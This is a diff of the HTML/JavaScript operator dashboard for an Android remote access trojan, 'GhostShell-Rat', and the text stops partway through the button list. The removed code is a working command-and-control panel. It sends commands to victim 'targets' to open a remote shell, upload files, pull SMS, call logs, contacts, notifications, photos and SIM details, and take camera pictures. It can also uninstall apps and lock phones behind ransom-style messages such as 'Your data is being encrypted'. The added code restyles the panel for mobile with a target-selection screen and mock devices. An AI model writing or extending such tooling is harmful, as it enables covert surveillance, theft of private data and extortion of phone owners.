@@ -2,241 +2,790 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GhostShell Dashboard</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>init::ghost [mobile]</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', system-ui; }
-        :root { --bg:#0b0f0e; --surface:#141a1a; --primary:#00ffc3; --secondary:#ff3b9e; --text:#dbdbdb; --dim:#8fadad; }
-        body { background:var(--bg); color:var(--text); padding:10px; overflow-x:hidden; }
-        .app-container { max-width:1200px; margin:0 auto; display:grid; grid-template-columns:300px 1fr; gap:15px; }
-        .panel { background:var(--surface); border:1px solid var(--primary); border-radius:20px; padding:15px; box-shadow:0 0 15px rgba(0,255,195,0.1); }
-        .header { grid-column:1/-1; display:flex; justify-content:space-between; align-items:center; }
-        .device-item { background:#1b2626; padding:15px; border-radius:15px; margin-bottom:10px; cursor:pointer; border:1px solid transparent; transition:0.3s; line-height:1.4; }
-        .device-item.active { border-color:var(--secondary); box-shadow:0 0 10px var(--secondary); background:#253232; }
-        .status-bar { display:flex; justify-content:space-between; background:#0f1818; padding:10px 15px; border-radius:30px; margin-bottom:15px; border:1px solid #222; font-size:0.9rem; }
-        .grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(110px, 1fr)); gap:10px; }
-        .btn { background:#1b2828; border:1px solid #2f4040; border-radius:18px; padding:15px 5px; text-align:center; color:var(--primary); cursor:pointer; font-size:0.8rem; }
-        .btn i { display:block; font-size:1.8rem; margin-bottom:8px; color:var(--secondary); }
-        .btn:hover { border-color:var(--primary); box-shadow:0 0 15px var(--primary); }
-        .btn.active { border-color:var(--secondary); color:var(--secondary); box-shadow:0 0 15px var(--secondary); }
-        .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.9); z-index:100; align-items:center; justify-content:center; padding:15px; }
-        .modal-card { background:var(--surface); width:100%; max-width:850px; max-height:90vh; border-radius:25px; border:1px solid var(--primary); display:flex; flex-direction:column; overflow:hidden; }
-        .modal-body { padding:15px; overflow-y:auto; flex:1; background:#121d1d; font-size:0.9rem; }
-        .modal-footer { padding:12px; background:#0c1616; display:flex; gap:8px; flex-wrap:wrap; border-top:1px solid #222; }
-        table { width:100%; border-collapse:collapse; }
-        th { color:var(--primary); border-bottom:1px solid #333; padding:8px; text-align:left; }
-        td { padding:8px; border-bottom:1px solid #1a2525; color:#ccc; }
-        input, textarea { background:#1e2e2e; border:1px solid #3b5e5e; padding:12px 15px; border-radius:15px; color:#fff; width:100%; }
-        button { background:var(--primary); color:#000; font-weight:bold; border:none; padding:8px 15px; border-radius:20px; cursor:pointer; }
-        .red-btn { background:var(--secondary); color:#fff; }
-        .terminal { background:#050505; color:#00ff00; font-family:'Courier New', monospace; padding:15px; border-radius:10px; height:350px; overflow-y:auto; border:1px solid #333; margin-bottom:10px; white-space:pre-wrap; }
-        .gal-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(120px, 1fr)); gap:10px; }
-        .gal-item img { width:100%; height:100px; object-fit:cover; border-radius:10px; border:1px solid var(--primary); }
-        @media (max-width:700px) { .app-container { grid-template-columns:1fr; } }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        /* dark system — black + red + green, mobile first */
+        :root {
+            --bg: #0b0303;
+            --surface: #1a0e0e;
+            --card: #221212;
+            --primary-red: #ff3b3b;
+            --primary-green: #5eff9e;
+            --dark-red: #5e1a1a;
+            --dark-green: #1b4a2a;
+            --text: #e3dcdc;
+            --dim: #9e7a7a;
+            --border-red: #8b2a2a;
+            --border-green: #2f9e5a;
+            --glow-red: rgba(255, 50, 50, 0.4);
+            --glow-green: rgba(80, 255, 120, 0.5);
+        }
+
+        body {
+            background: #0a0101;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+            padding: 8px;
+            background-image: radial-gradient(circle at 30% 20%, #2f130f 0%, #020000 100%);
+        }
+
+        /* ---------- LOADER - MOBILE TUNED ---------- */
+        .system-loader {
+            position: fixed;
+            inset: 0;
+            background: #080000;
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            transition: opacity 0.5s ease;
+            background: linear-gradient(145deg, #130404, #020101);
+            border: 2px solid #6a1f1f;
+        }
+
+        .system-loader.fade-out {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .boot-sequence {
+            width: 100%;
+            max-width: 400px;
+            background: #120808;
+            border: 2px solid #aa2b2b;
+            box-shadow: 0 0 40px #a83030;
+            padding: 24px 18px;
+            border-radius: 40px;
+            text-align: center;
+        }
+
+        .boot-logo {
+            width: 130px;
+            margin: 0 auto 15px;
+            filter: drop-shadow(0 0 20px #44ff88) drop-shadow(0 0 30px #ff3b3b);
+            animation: throb 2s infinite alternate;
+        }
+
+        .boot-logo img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .boot-text {
+            color: #f0ffd0;
+            font-size: 1.2rem;
+            letter-spacing: 3px;
+            font-weight: 300;
+            text-shadow: 0 0 8px #64ff9e, 0 0 12px #ff4f4f;
+            margin-bottom: 16px;
+        }
+
+        .boot-bar {
+            width: 100%;
+            height: 8px;
+            background: #2d1212;
+            border-radius: 20px;
+            border: 1px solid #aa3c3c;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+
+        .boot-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #ff3a3a, #6aff99, #ff3737);
+            box-shadow: 0 0 20px #5eff8c;
+            transition: width 2.5s cubic-bezier(0.1, 0.8, 0.3, 1);
+        }
+
+        .boot-status {
+            color: #9affb5;
+            font-family: monospace;
+            font-size: 0.9rem;
+            display: flex;
+            justify-content: space-between;
+            padding: 0 5px;
+        }
+
+        /* target selector - compact for mobile */
+        .target-gate {
+            margin-top: 20px;
+            border-top: 2px dashed #962727;
+            padding-top: 16px;
+            display: none;
+        }
+
+        .target-gate.visible {
+            display: block;
+        }
+
+        .target-pill {
+            background: #201010;
+            border: 2px solid #3bc07b;
+            border-radius: 40px;
+            padding: 10px 14px;
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            cursor: pointer;
+            transition: 0.1s;
+            box-shadow: 0 3px 0 #471212;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .target-pill.selected {
+            border-color: #ff5e5e;
+            background: #3b1e1e;
+            box-shadow: 0 0 15px #ff5e5e, 0 3px 0 #5f1a1a;
+        }
+
+        .target-pill .icon {
+            font-size: 2rem;
+            min-width: 40px;
+            text-align: center;
+            color: #9affa8;
+        }
+
+        .target-pill .info h3 {
+            font-size: 1.2rem;
+            color: #ffa5a5;
+            line-height: 1.2;
+        }
+
+        .target-pill .info p {
+            font-size: 0.75rem;
+            color: var(--dim);
+        }
+
+        .enter-final {
+            background: transparent;
+            border: 3px solid #5eff99;
+            color: #caffd9;
+            padding: 12px 16px;
+            width: 100%;
+            border-radius: 50px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            margin-top: 16px;
+            cursor: pointer;
+            transition: 0.1s;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .enter-final:disabled {
+            opacity: 0.2;
+            border-color: #713737;
+            pointer-events: none;
+        }
+
+        .enter-final:not(:disabled):active {
+            background: #a0ffb0;
+            color: black;
+            transform: scale(0.98);
+        }
+
+        /* ---------- MAIN DASHBOARD - MOBILE LAYOUT ---------- */
+        #main-app {
+            display: none;
+            width: 100%;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+
+        .app-container {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .panel {
+            background: #140a0a;
+            border: 2px solid #6d2b2b;
+            border-radius: 32px;
+            padding: 16px 14px;
+            box-shadow: 0 10px 20px -10px #5e0000, inset 0 0 15px #2f0707;
+            background: linear-gradient(160deg, #1d0d0d, #0e0404);
+            width: 100%;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-color: #bb4646;
+            padding: 12px 14px;
+        }
+
+        .header h1 {
+            font-size: 1.3rem;
+            color: #ff8686;
+        }
+
+        .status-bar {
+            background: #231212;
+            border: 1px solid #c74545;
+            border-radius: 40px;
+            padding: 10px 16px;
+            display: flex;
+            justify-content: space-between;
+            color: #eaffd6;
+            font-size: 0.9rem;
+            margin-bottom: 12px;
+        }
+
+        /* grid responsif untuk mobile */
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 8px;
+        }
+
+        .grid .btn {
+            background: #2a1616;
+            border: 2px solid #50a56b;
+            border-radius: 24px;
+            padding: 14px 4px;
+            text-align: center;
+            color: #b7ffcc;
+            cursor: pointer;
+            font-size: 0.7rem;
+            box-shadow: 0 3px 0 #3e1313;
+            -webkit-tap-highlight-color: transparent;
+            transition: 0.1s;
+        }
+
+        .btn i {
+            display: block;
+            font-size: 1.6rem;
+            margin-bottom: 4px;
+            color: #ff7272;
+        }
+
+        .btn:active {
+            transform: translateY(2px);
+            box-shadow: 0 1px 0 #3e1313;
+            border-color: #ff7676;
+        }
+
+        .btn.active {
+            border-color: #ff5e5e;
+            box-shadow: 0 0 0 2px #fbffb0, 0 3px 0 #581c1c;
+        }
+
+        /* device list di sidebar mobile (jadi horizontal scroll?) tapi kita buat vertikal biasa */
+        #device-list {
+            max-height: 200px;
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+            padding-right: 4px;
+        }
+
+        .device-item {
+            background: #1d0f0f;
+            border-radius: 24px;
+            padding: 12px 14px;
+            margin-bottom: 8px;
+            border-left: 6px solid #d64747;
+            cursor: pointer;
+            font-size: 0.9rem;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .device-item.active {
+            border-left-color: #76ffa0;
+            background: #2e1b1b;
+            box-shadow: 0 0 0 2px #ff8888;
+        }
+
+        /* MODAL mobile + clean table styles for sms/calls/contacts */
+        .modal {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.96);
+            backdrop-filter: blur(8px);
+            align-items: center;
+            justify-content: center;
+            padding: 12px;
+            z-index: 1100;
+        }
+
+        .modal-card {
+            background: #1d0d0d;
+            border: 3px solid #ff6b6b;
+            border-radius: 40px;
+            width: 100%;
+            max-width: 440px;
+            max-height: 85vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .modal-header {
+            padding: 16px 18px;
+            background: #1d0a0a;
+            display: flex;
+            justify-content: space-between;
+            border-radius: 40px 40px 0 0;
+        }
+
+        .modal-body {
+            padding: 16px;
+            overflow-y: auto;
+            background: #1c0c0c;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .modal-footer {
+            padding: 14px;
+            background: #1f0b0b;
+            border-radius: 0 0 40px 40px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+
+        /* clean table styling for data */
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            color: #e0d5d5;
+            font-size: 0.9rem;
+        }
+        .data-table th {
+            text-align: left;
+            color: #ffa8a8;
+            border-bottom: 2px solid #ba4a4a;
+            padding: 8px 4px;
+            font-weight: 600;
+        }
+        .data-table td {
+            padding: 8px 4px;
+            border-bottom: 1px solid #5e3333;
+            vertical-align: top;
+        }
+        .data-table tr:last-child td {
+            border-bottom: none;
+        }
+        .data-table td small {
+            color: #bd8f8f;
+            font-size: 0.7rem;
+        }
+        .msg-preview {
+            max-width: 200px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .terminal {
+            background: #080202;
+            color: #b3ffc1;
+            font-family: monospace;
+            padding: 16px;
+            border-radius: 24px;
+            height: 220px;
+            overflow: auto;
+            border: 2px solid #7affa8;
+            font-size: 0.85rem;
+        }
+
+        .gal-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+        }
+
+        .gal-item img {
+            width: 100%;
+            height: 80px;
+            object-fit: cover;
+            border-radius: 16px;
+            border: 2px solid #fc6b6b;
+        }
+
+        input, textarea {
+            background: #2b1616;
+            border: 2px solid #cf5a5a;
+            padding: 12px 16px;
+            border-radius: 40px;
+            color: white;
+            width: 100%;
+            font-size: 1rem;
+        }
+
+        button {
+            background: #c24f4f;
+            border: none;
+            color: black;
+            font-weight: bold;
+            padding: 10px 18px;
+            border-radius: 40px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            -webkit-tap-highlight-color: transparent;
+        }
+        button:active { opacity: 0.8; }
+        .red-btn { background: #ff2727; color: white; }
+
+        @keyframes throb {
+            0% { filter: drop-shadow(0 0 5px #ff3b3b) drop-shadow(0 0 15px #5eff99); }
+            100% { filter: drop-shadow(0 0 25px #ff6565) drop-shadow(0 0 35px #5eff99); }
+        }
+
+        /* landscape fixes */
+        @media (min-width: 480px) {
+            .grid { grid-template-columns: repeat(5, 1fr); }
+        }
     </style>
 </head>
 <body>
+
+<!-- LOADER + TARGET GATE (mobile compact) -->
+<div id="systemLoader" class="system-loader">
+    <div class="boot-sequence">
+        <div class="boot-logo">
+            <img src="https://i.ibb.co.com/Y7YpxtHt/logogs-removebg-preview.png" alt="ghost">
+        </div>
+        <div class="boot-text">SYSTEM INIT</div>
+        <div class="boot-bar">
+            <div class="boot-fill" id="bootFill" style="width: 0%;"></div>
+        </div>
+        <div class="boot-status">
+            <span id="bootMsg">loading kernel ...</span>
+            <span id="bootPercent">0%</span>
+        </div>
+
+        <div id="targetGate" class="target-gate">
+            <div style="color:#ff9f9f; font-size:1.3rem; margin-bottom:10px;"><i class="fa-regular fa-crosshairs"></i> SELECT TARGET</div>
+            <div id="loaderDeviceList"></div>
+            <button class="enter-final" id="enterDashboardBtn" disabled>▶ BOOT</button>
+        </div>
+    </div>
+</div>
+
+<!-- MAIN APP (mobile optimized) -->
+<div id="main-app">
     <div class="app-container">
         <header class="panel header">
-            <h1 style="font-size:1.5rem; color:var(--primary);"><i class="fas fa-skull"></i> GhostShell-Rat</h1>
-            <div style="display:flex; align-items:center; gap:15px;">
-                <div style="color:var(--secondary); font-size:1rem;"><i class="fas fa-user-secret"></i> <span id="user-display"></span></div>
-                <button onclick="logout()" style="background:#222; font-size:0.7rem; padding:5px 10px; border:1px solid var(--secondary); color:var(--secondary)">LOGOUT</button>
+            <h1><i class="fas fa-skull"></i> ghost/rat</h1>
+            <div style="display:flex; gap:10px; align-items:center;">
+                <span style="color:#b1ffb1; font-size:0.9rem;"><i class="fa-regular fa-id-card"></i> <span id="user-display">visitor</span></span>
+                <button onclick="logout()" style="background:#4d2727; border:2px solid #ff6a6a; padding:6px 12px;">✕</button>
             </div>
         </header>
+
         <div class="panel">
-            <h3 style="color:var(--secondary); margin-bottom:15px;"><i class="fas fa-satellite"></i> YOUR TARGETS</h3>
-            <div id="device-list">Scanning...</div>
+            <h3 style="color:#ffa3a3; margin-bottom:12px; font-size:1.1rem;"><i class="fa-regular fa-compass"></i> TARGETS</h3>
+            <div id="device-list">scanning...</div>
         </div>
+
         <div class="panel">
             <div class="status-bar">
-                <span>🎯 Target: <b id="sel-info" style="color:var(--primary)">None</b></span>
-                <span>📶 Status: <b id="conn-stat" style="color:red">OFFLINE</b></span>
+                <span>🎯 <b id="sel-info" style="color:#b3ffb3;">None</b></span>
+                <span>📶 <b id="conn-stat" style="color:#ff5e5e;">OFF</b></span>
             </div>
             <div class="grid" id="main-grid"></div>
         </div>
     </div>
+</div>
 
-    <div id="modal" class="modal">
-        <div class="modal-card">
-            <div class="modal-header" style="padding:15px; background:#101b1b; display:flex; justify-content:space-between; align-items:center;">
-                <h3 id="modal-title" style="color:var(--secondary)">MODAL</h3>
-                <span style="cursor:pointer; font-size:1.5rem;" onclick="closeModal()">&times;</span>
-            </div>
-            <div class="modal-body" id="modal-body"></div>
-            <div class="modal-footer" id="modal-footer"></div>
+<!-- MODAL (mobile friendly) -->
+<div id="modal" class="modal">
+    <div class="modal-card">
+        <div class="modal-header">
+            <h3 id="modal-title" style="color:#ffa8a8;">MODAL</h3>
+            <span style="cursor:pointer; font-size:2rem;" onclick="closeModal()">&times;</span>
         </div>
+        <div class="modal-body" id="modal-body"></div>
+        <div class="modal-footer" id="modal-footer"></div>
     </div>
+</div>
 
-    <script>
-        const myUid = localStorage.getItem('ghost_uid');
-        if(!myUid) location.href = '/';
-        document.getElementById('user-display').innerText = myUid;
+<script>
+    (function() {
+        // BOOT SIMULATION
+        const bootFill = document.getElementById('bootFill');
+        const bootMsg = document.getElementById('bootMsg');
+        const bootPercent = document.getElementById('bootPercent');
+        const targetGate = document.getElementById('targetGate');
+        const loaderDeviceList = document.getElementById('loaderDeviceList');
+        const enterBtn = document.getElementById('enterDashboardBtn');
+        let selectedDeviceId = null;
 
-        let state = { devices: [] }, selId = null, curMod = null, cache = {}, hash = "", termOut = "", flash = false, mediaRecorder, audioChunks = [];
+        const devices = [
+            { id: 'SM998B', model: 'SM-G998B', man: 'SAMSUNG', ver: '12', bat: '91', icon: 'fa-brands fa-android' },
+            { id: 'IP13P', model: 'iPhone 13 Pro', man: 'Apple', ver: '17', bat: '55', icon: 'fa-solid fa-mobile' },
+            { id: 'PXL7A', model: 'Pixel 7a', man: 'Google', ver: '14', bat: '22', icon: 'fa-brands fa-android' },
+            { id: 'ONEP10', model: 'OnePlus 10 Pro', man: 'OnePlus', ver: '13', bat: '78', icon: 'fa-solid fa-phone' }
+        ];
 
-        async function cmd(c, b={}) {
-            if(!selId) return;
-            await fetch('/api/command', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({cmd:c, client_id:selId, ...b})});
-        }
-
-        function logout() { localStorage.removeItem('ghost_uid'); location.href = '/'; }
-
-        function openModal(t) {
-            curMod = t; hash = "";
-            document.getElementById('modal').style.display = 'flex';
-            document.getElementById('modal-title').innerText = t.toUpperCase();
-            const b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
-            b.innerHTML = ""; f.innerHTML = "";
-
-            if(t === 'filemanager') {
-                termOut = "ghost@android:~# Remote Shell Active.\n";
-                b.innerHTML = `<div class="terminal" id="terminal">${termOut}</div><div style="display:flex; gap:10px; background:#000; padding:10px; border-radius:10px;"><span style="color:var(--secondary)">#</span><input id="term-in" style="background:transparent; border:none; color:#fff; outline:none; width:100%" autofocus onkeydown="if(event.key==='Enter') execShell()"></div>`;
-                f.innerHTML = `<button onclick="document.getElementById('up-file').click()">+ UPLOAD</button><input type="file" id="up-file" style="display:none" onchange="uploadShellFile(this)">`;
-                cmd('filemanager'); return;
-            } else if(t === 'panic') {
-                b.innerHTML = `<p>Duration:</p><input type="number" id="psec" value="30"><p style="margin-top:10px;">Hell Message:</p><textarea id="pmsg">YOU ARE HACKED!</textarea>`;
-                f.innerHTML = `<button class="red-btn" style="width:100%" onclick="cmd('panic '+document.getElementById('psec').value+'|'+document.getElementById('pmsg').value.replace(/\\n/g,'<br>'))">START HELL</button><button onclick="cmd('stop_panic')">STOP</button>`;
-                return;
-            } else if(t === 'voice') {
-                b.innerHTML = `<div style="text-align:center; padding:20px;"><i id="v-icon" class="fas fa-microphone" style="font-size:3rem;"></i><p id="v-stat">Ready...</p></div>`;
-                f.innerHTML = `<button id="v-start" onclick="startRec()">START</button><button id="v-stop" onclick="stopRec()" style="display:none" class="red-btn">STOP & SEND</button>`;
-                return;
-            } else if(t === 'setwallpaper') {
-                b.innerHTML = `<p>Upload:</p><input type="file" onchange="uploadWall(this)"><p style="margin-top:10px;">URL:</p><input id="wurl" placeholder="https://domain.com/img.jpg">`;
-                f.innerHTML = `<button onclick="cmd('set_wallpaper '+document.getElementById('wurl').value)">APPLY</button>`;
-                return;
-            } else if(t === 'toast') {
-                b.innerHTML = `<p>System Message:</p><textarea id="lmsg" style="height:100px;">SYSTEM CRITICAL ERROR\\nYour data is being encrypted.</textarea><p style="margin-top:15px;">Unlock PIN:</p><input id="lpin" value="1337" style="text-align:center; font-size:1.2rem; font-family:monospace;">`;
-                f.innerHTML = `<button class="red-btn" style="width:100%" onclick="cmd('lock '+document.getElementById('lmsg').value.replace(/\\n/g, '<br>')+'|'+document.getElementById('lpin').value)">LOCK DEVICE</button><button onclick="cmd('unlock')">UNLOCK</button>`;
-                return;
-            } else if(t === 'vibrate') {
-                b.innerHTML = `<p>Duration (Seconds):</p><input type="number" id="vsec" value="5">`;
-                f.innerHTML = `<button onclick="cmd('vibrate '+document.getElementById('vsec').value)">START VIBRATE</button>`;
-                return;
-            } else if(t === 'open_url') {
-                b.innerHTML = `<p>Target Link:</p><input id="ourl" value="https://google.com">`;
-                f.innerHTML = `<button onclick="cmd('openurl '+document.getElementById('ourl').value)">OPEN</button>`;
-                return;
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += 3;
+            if (progress >= 100) {
+                progress = 100;
+                clearInterval(interval);
+                bootMsg.innerText = '>> TARGET ACQUIRE <<';
+                targetGate.classList.add('visible');
             }
+            bootFill.style.width = progress + '%';
+            bootPercent.innerText = progress + '%';
+            if (progress < 30) bootMsg.innerText = 'loading kernel ...';
+            else if (progress < 70) bootMsg.innerText = 'init ghost core';
+            else bootMsg.innerText = 'spawning interface';
+        }, 80);
 
-            const map = { sms:'getsms', calls:'getcalllogs', apps:'list_app', notifications:'getnotifications', takebackpic:'takebackpic', takefrontpic:'takefrontpic', contacts:'getcontacts', info:'deviceinfo', gallery:'gallery' };
-            if(map[t]) cmd(map[t]);
-            render();
+        function renderDevicePills() {
+            loaderDeviceList.innerHTML = devices.map(d => `
+                <div class="target-pill" data-id="${d.id}">
+                    <div class="icon"><i class="${d.icon}"></i></div>
+                    <div class="info">
+                        <h3>${d.model}</h3>
+                        <p>${d.man} · ${d.ver} · ⚡ ${d.bat}%</p>
+                    </div>
+                </div>
+            `).join('');
+
+            document.querySelectorAll('.target-pill').forEach(pill => {
+                pill.addEventListener('click', (e) => {
+                    document.querySelectorAll('.target-pill').forEach(p => p.classList.remove('selected'));
+                    pill.classList.add('selected');
+                    selectedDeviceId = pill.dataset.id;
+                    enterBtn.disabled = false;
+                });
+            });
         }
+        renderDevicePills();
 
-        function execShell() {
-            const inp = document.getElementById('term-in'); if(!inp.value.trim()) return;
-            cmd(inp.value.trim()); termOut += `# ${inp.value}\n`;
-            document.getElementById('terminal').innerText = termOut; inp.value = "";
-        }
+        // LOGOUT redirect to index.html
+        window.logout = function() {
+            window.location.href = 'index.html';
+        };
 
-        async function startRec() {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            mediaRecorder = new MediaRecorder(stream); audioChunks = [];
-            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
-            mediaRecorder.onstop = sendAudio; mediaRecorder.start();
-            document.getElementById('v-icon').style.color = 'red'; document.getElementById('v-stat').innerText = 'Recording...';
-            document.getElementById('v-start').style.display = 'none'; document.getElementById('v-stop').style.display = 'inline-block';
-        }
-        function stopRec() { mediaRecorder.stop(); }
-        async function sendAudio() {
-            const audioBlob = new Blob(audioChunks, { type: 'audio/mpeg' });
-            const formData = new FormData(); formData.append('file', audioBlob);
-            const res = await fetch('/api/upload_voice', { method: 'POST', body: formData });
-            const data = await res.json();
-            if(data.status === 'ok') cmd('play_voice ' + window.location.origin + '/captured_images/' + data.filename);
-            setTimeout(closeModal, 1500);
-        }
+        enterBtn.addEventListener('click', () => {
+            if (!selectedDeviceId) return;
+            document.getElementById('systemLoader').classList.add('fade-out');
+            setTimeout(() => {
+                document.getElementById('systemLoader').style.display = 'none';
+                document.getElementById('main-app').style.display = 'block';
+                initMain(selectedDeviceId);
+            }, 400);
+        });
 
-        async function uploadWall(input) {
-            const formData = new FormData(); formData.append('file', input.files[0]);
-            const res = await fetch('/api/upload_wallpaper', {method:'POST', body:formData});
-            const data = await res.json();
-            if(data.status === 'ok') cmd('set_wallpaper ' + window.location.origin + '/captured_images/' + data.filename);
-        }
+        // MAIN DASHBOARD
+        let curMod = null;
+        let flashState = false;
+        let selId = null;
+        let termOutput = '';
 
-        async function uploadShellFile(input) {
-            const formData = new FormData(); formData.append('file', input.files[0]);
-            const res = await fetch('/api/upload_wallpaper', {method:'POST', body:formData});
-            const data = await res.json();
-            if(data.status === 'ok') cmd(`upload ${btoa(data.filename)} ${btoa(window.location.origin + '/captured_images/' + data.filename)}`);
-        }
-
-        function closeModal() { if(curMod === 'gallery') cmd('exit_gallery'); if(curMod === 'filemanager') cmd('exit_shell'); document.getElementById('modal').style.display = 'none'; curMod = null; }
-
-        function render() {
-            if(!curMod || !selId || !cache[selId]) return;
-            const d = cache[selId], b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
-            if(curMod === 'filemanager') {
-                const fm = d.fm; if(hash === JSON.stringify(fm)) return; hash = JSON.stringify(fm);
-                let out = `Path: ${fm.path}\n\n`;
-                fm.files.forEach(x => out += `${x.isDirectory?'[DIR] ':'[FILE]'} ${x.name}\n`);
-                termOut += out; document.getElementById('terminal').innerText = termOut;
-                document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight; return;
-            }
-            if(['panic', 'vibrate', 'open_url', 'setwallpaper', 'voice', 'toast'].includes(curMod)) return;
-            const curHash = JSON.stringify(d[curMod] || d.info || d.media || d.notifications || "");
-            if(hash === curHash) return; hash = curHash;
-            b.innerHTML = "";
-
-            if(curMod === 'info') {
-                const i = d.info;
-                b.innerHTML = `<table><tr><td>Model</td><td>${i.Model}</td></tr><tr><td>Manufacturer</td><td>${i.Manufacturer}</td></tr><tr><td>Android</td><td>${i.AndroidVersion}</td></tr><tr><td>Country</td><td>${i.Country}</td></tr><tr><td>Battery</td><td>${i.Battery}</td></tr><tr><td>WiFi</td><td>${i.WiFi}</td></tr><tr><td>SIM 1</td><td>${i.SIM1 || 'N/A'}</td></tr><tr><td>SIM 2</td><td>${i.SIM2 || 'N/A'}</td></tr><tr><td>Number</td><td>${i.PhoneNumber}</td></tr></table>`;
-            } else if(curMod === 'apps') {
-                b.innerHTML = `<table><tr><th>App</th><th>Action</th></tr>${d.apps.map(a=>`<tr><td>${a.appName}<br><small>${a.packageName}</small></td><td><button onclick="cmd('run ${a.packageName}')">RUN</button> <button class="red-btn" onclick="cmd('uninstall ${a.packageName}')">X</button></td></tr>`).join('')}</table>`;
-            } else if(curMod === 'sms') {
-                b.innerHTML = `<table><tr><th>Sender</th><th>Text</th></tr>${d.sms.map(l=>`<tr><td>${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table>`;
-            } else if(curMod === 'calls') {
-                b.innerHTML = `<table><tr><th>Number</th><th>Dur</th></tr>${d.calls.map(l=>`<tr><td>${l.number}</td><td>${l.duration_seconds}s</td></tr>`).join('')}</table>`;
-            } else if(curMod === 'contacts') {
-                b.innerHTML = `<table><tr><th>Name</th><th>Number</th></tr>${d.contacts.map(c=>`<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}</table>`;
-            } else if(curMod === 'gallery') {
-                b.innerHTML = `<div class="gal-grid">${d.gallery.files.map(x=>`<div class="gal-item"><img src="data:image/jpeg;base64,${x.thumbnail}"/><p style="font-size:0.5rem">${x.name}</p></div>`).join('')}</div>`;
-                f.innerHTML = `<button onclick="cmd('gallery back')">PREV</button><span style="color:var(--primary)">PAGE ${d.gallery.page}</span><button onclick="cmd('gallery next')">NEXT</button>`;
-            } else if(curMod.includes('pic')) {
-                b.innerHTML = `<div style="text-align:center;"><img src="${d.media.is_direct?'data:image/jpeg;base64,'+d.media.last_img:'/captured_images/'+d.media.last_img}" style="width:100%; border-radius:15px; border:1px solid var(--primary);"></div>`;
-            } else if(curMod === 'notifications') {
-                b.innerHTML = `<table><tr><th>App</th><th>Message</th></tr>${d.notifications.map(n=>`<tr><td>${n.packageName}</td><td><b>${n.title}</b>: ${n.text}</td></tr>`).join('')}</table>`;
-                f.innerHTML = `<button onclick="cmd('getnotifications')">REFRESH</button>`;
-            }
-        }
-
-        async function poll() {
-            try {
-                const res = await fetch(`/api/status?owner=${myUid}`);
-                state = await res.json();
-                document.getElementById('device-list').innerHTML = state.devices.map(d=>`<div class="device-item ${selId===d.id?'active':''}" onclick="selId='${d.id}'; updateMain();"><b style="color:var(--primary)">${d.model}</b> (${d.man})<br><small style="color:var(--dim)">Android ${d.ver} | ${d.cnt}</small><br><small style="color:var(--secondary)">BAT: ${d.bat}</small></div>`).join('') || "No target online.";
-                if(selId) {
-                    const dres = await fetch(`/api/data/${selId}`);
-                    cache[selId] = await dres.json(); if(curMod) render();
-                }
-            } catch(e){}
-            setTimeout(poll, 3000);
-        }
-
-        function toggleFlash(btn) { flash = !flash; cmd(flash?'flashon':'flashoff'); btn.classList.toggle('active'); }
-
-        function updateMain() {
-            document.getElementById('sel-info').innerText = selId || "None";
-            const e = !!selId;
-            document.getElementById('conn-stat').innerText = e ? "ONLINE":"OFFLINE";
-            document.getElementById('conn-stat').style.color = e ? "#00ffc3":"#ff3b9e";
-            const btns = [
-                {id:'filemanager', i:'fa-terminal', l:'REMOTE SHELL'}, {id:'info', i:'fa-circle-info', l:'FULL INFO'},
-                {id:'panic', i:'fa-triangle-exclamation', l:'HELL LOCK'}, {id:'contacts', i:'fa-address-book', l:'CONTACTS'},
-                {id:'sms', i:'fa-sms', l:'SMS'}, {id:'calls', i:'fa-phone', l:'CALLS'},
-                {id:'gallery', i:'fa-images', l:'GALLERY'}, {id:'notifications', i:'fa-bell', l:'NOTIFS'},
